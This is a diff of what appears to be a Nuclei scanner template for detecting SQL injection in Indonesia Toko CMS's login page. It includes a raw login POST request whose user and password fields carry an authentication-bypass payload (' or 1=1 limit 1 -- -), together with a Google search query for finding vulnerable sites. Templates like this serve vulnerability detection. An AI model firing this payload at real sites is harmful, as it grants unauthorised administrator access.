@@ -1,5 +1,4 @@
 id: indonasia-toko-cms-sql
-
 info:
   name: Indonasia Toko CMS - SQL Injection
   author: r3Y3r53
@@ -8,29 +7,28 @@ info:
     Indonesia Toko CMS is susceptible to SQL Injection in its login system, enabling attackers to exploit vulnerabilities and bypass authentication by injecting malicious SQL code.
   reference:
     - https://cxsecurity.com/issue/WLB-2019030008
+  classification:
+    cwe-id:
+      - CWE-89
   metadata:
-    verified: true
-    max-request: 1
     google-query: inurl:"index.php?mnu=login"
-  tags: sqli,toko,cms,vuln
-
+    max-request: 1
+    verified: true
+  tags: cms,sqli,toko,vuln
 http:
-  - raw:
+  - matchers:
+      - part: body
+        type: word
+        words:
+          - alert('Administrator
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /index.php?mnu=login HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         user=%27+or+1%3D1+limit+1+--+-%2B&pass=%27+or+1%3D1+limit+1+--+-%2B&Login=Login
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "alert('Administrator"
-
-      - type: status
-        status:
-          - 200
-
